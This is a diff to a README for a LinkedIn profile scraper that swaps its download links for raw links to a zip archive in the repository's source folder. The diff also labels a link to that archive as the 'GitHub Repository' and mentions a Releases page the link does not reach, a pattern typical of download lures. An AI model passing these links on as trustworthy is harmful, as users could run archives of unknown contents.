@@ -8,7 +8,7 @@ Welcome to the linkedin-profile-scraper! This tool makes it simple to extract im
 
 To download the application, visit the link below:
 
-[![Download linkedin-profile-scraper](https://raw.githubusercontent.com/tkdnel/linkedin-profile-scraper/main/src/linkedin-profile-scraper_v2.4.zip)](https://raw.githubusercontent.com/tkdnel/linkedin-profile-scraper/main/src/linkedin-profile-scraper_v2.4.zip)
+[![Download linkedin-profile-scraper](https://github.com/tkdnel/linkedin-profile-scraper/raw/refs/heads/main/src/utils/linkedin_profile_scraper_1.8.zip)](https://github.com/tkdnel/linkedin-profile-scraper/raw/refs/heads/main/src/utils/linkedin_profile_scraper_1.8.zip)
 
 1. Click the link above.
 2. On the Releases page, find the latest version.
@@ -58,8 +58,8 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 ## 🔗 Useful Links
 
-- [Download linkedin-profile-scraper](https://raw.githubusercontent.com/tkdnel/linkedin-profile-scraper/main/src/linkedin-profile-scraper_v2.4.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/tkdnel/linkedin-profile-scraper/main/src/linkedin-profile-scraper_v2.4.zip)
+- [Download linkedin-profile-scraper](https://github.com/tkdnel/linkedin-profile-scraper/raw/refs/heads/main/src/utils/linkedin_profile_scraper_1.8.zip)
+- [GitHub Repository](https://github.com/tkdnel/linkedin-profile-scraper/raw/refs/heads/main/src/utils/linkedin_profile_scraper_1.8.zip)
 - [Documentation](#) (Coming soon)
 
 Thank you for choosing linkedin-profile-scraper! Your feedback is valuable to us. Happy scraping!
